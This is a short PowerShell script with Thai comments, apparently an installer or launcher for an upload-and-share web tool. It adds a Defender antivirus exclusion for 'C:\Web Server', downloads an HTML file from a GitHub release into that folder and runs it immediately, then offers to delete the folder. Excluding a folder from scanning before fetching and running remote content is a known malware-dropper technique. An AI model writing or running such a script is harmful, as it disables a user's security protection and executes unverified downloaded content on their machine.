$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$dir = "C:\Web Server"; $file = "$dir\Upload.Share.html"
$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/Upload.Share.html"

# --- Execute Tasks ---
if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
Add-MpPreference -ExclusionPath $dir

# ดาวน์โหลดผ่าน .NET WebClient (Synchronous) และรันไฟล์ทันที
(New-Object System.Net.WebClient).DownloadFile($url, $file)
Start-Process $file

# --- Interactive Choice ---
Clear-Host
$ans = Read-Host "ต้องการลบ 'ฝากไฟล์ & แชร์ไฟล์' หรือไม่? (Y/N)"

if ($ans -match "y") {
    Remove-Item -Path $dir -Recurse -Force
    Write-Host "`n[!] ลบ ฝากไฟล์ & แชร์ไฟล์ เรียบร้อยแล้ว" -ForegroundColor Yellow
} else {
    Write-Host "`n[+] คุณสามารถ 'บันทึกเป็น แถบรายการโปรด' เพื่อเรียกใช้ ฝากไฟล์ & แชร์ไฟล์ ได้สะดวกยิ่งขึ้น" -ForegroundColor Cyan
}

$ProgressPreference = 'Continue'
